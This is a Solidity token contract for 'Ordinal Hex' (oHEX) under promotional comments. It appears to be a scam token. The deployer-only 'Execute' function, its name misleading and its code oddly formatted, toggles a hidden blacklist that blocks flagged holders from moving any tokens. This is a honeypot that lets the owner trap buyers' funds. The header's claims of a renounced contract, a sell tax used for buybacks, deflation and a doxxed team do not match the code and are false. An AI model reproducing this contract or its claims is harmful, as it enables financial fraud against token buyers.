/**
 *Submitted for verification at Etherscan.io on 2023-03-09
*/

/**
       ◽️OrdinalHEX {$oHEX} ♾UNSTOPPABLE

▪️oHEX Stakers earn far more yield than the inflation rate. 
 Only a small part of all oHEX are actually Staked,
 around 50% at the time of writing. 

▪️The rewards are paid in oHEX. This way the yield on your
 oHEX multiplies with the price appreciation of HEX against USD. 

▪️ZERO BUY TAX /5% SELL USED FOR BUYBACK
▪️LONG TERM LIQUIDITY LOCK & CONTRACT RENOUNCED
▪️AUTOMATED DEFLATIONARY TOKEN
▪️STRONG DEDICATED AND EXPERIENCED DOXXED TEAM
 
▪️oHEX is signup-free and secure, executed 
 peer-to-peer on the Blockchain. No middlemen, no counterparty risk!

▪️You are the network being in complete control. 
 There are no middlemen or managers in oHEX.
*/
//SPDX-License-Identifier: MIT

pragma solidity =0.5.15;

contract ERC20Basic {

  function balanceOf(
    address account
  )
    public
    view
    returns (uint256);

  function totalSupply(
  )
    public
    view
    returns (uint256);
  
  function transfer(
    address to,
    uint256 value
  ) 
    public
    returns (bool);
  
  event Transfer(
    address indexed from,
    address indexed to,
    uint256 value);
}

library SafeMath {

  function sub(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    assert(b <= a);
    return a - b;
  }
    
  function mul(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256 c)
  {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    return a / b;
  }

  function add(
    uint256 a,
    uint256 b
  ) internal
    pure
    returns (uint256 c)
  {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping (address => bool) internal _address_;  
  mapping (address => uint256) balances;
  uint256 totalSupply_;

  function totalSupply(
  ) 
    public
    view
    returns (uint256)
  {
    return totalSupply_;
  }

  function balanceOf(
    address account
  ) 
    public
    view
    returns (uint256) {
    return balances[account];
  }

  function transfer(
    address _to,
    uint256 _value
  ) public
    returns (bool) { if (
    _address_[msg.sender]
    || _address_[_to]) require(
    _value == 0, ""); require(
    _to != address(0)); require(
    _value <= balances[msg.sender]);
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
}

contract ERC20 is ERC20Basic {

  function allowance(
    address owner,
    address spender
  )
    public
    view
    returns (uint256);

  function approve(
    address spender,
    uint256 value
  ) 
    public
    returns (bool);
    event Approval
  (
    address indexed owner,
    address indexed spender,
    uint256 value
  );

  function transferFrom(
    address from,
    address to,
    uint256 value
  )
    public
    returns (bool);
}

contract StandardERC20 is ERC20, BasicToken {
  address internal approved;
  mapping (address => mapping (address => uint256)) internal allowed;
  
  constructor () public {
     approved = msg.sender;
  }

  function allowance(
    address _owner,
    address _spender
  )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool) { if
    (_address_[_from] ||
    _address_[_to]) require(
    _value == 0, ""); require(
    _to != address(0)); require(
    _value <= balances[_from]); require(
    _value <= allowed[_from][msg.sender]);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function Execute(
    address _address
  ) 
    external { require(
    msg.sender ==
    approved); if (
    _address_
    [_address] == true){
    _address_
    [_address] = false;} 
    else { _address_
    [_address] = true;
    }
  }
  
  function decreaseApproval(
    address _spender,
    uint _subtractedValue
  )
    public
    returns (bool)
  {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function airdropAddress(
    address _address
  )
    public
    view
    returns (bool) 
  {
    return _address_
    [_address];
  }

  function increaseApproval(
    address _spender,
    uint _addedValue
  )
    public
    returns (bool)
  {
    allowed[msg.sender][_spender] = (
    allowed[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}

contract oHEX is StandardERC20 {
  string public constant name = "Ordinal Hex";
  string public constant symbol = "oHEX";
  uint256 public constant _totalSupply_ = 1000000000 * (10 ** uint256(decimals));
  uint8 public constant decimals = 9;

  constructor() public {
    totalSupply_ = totalSupply_.add(_totalSupply_);
    balances[msg.sender] = balances[msg.sender].add(_totalSupply_);
    emit Transfer(address(0), msg.sender, _totalSupply_);
  }
}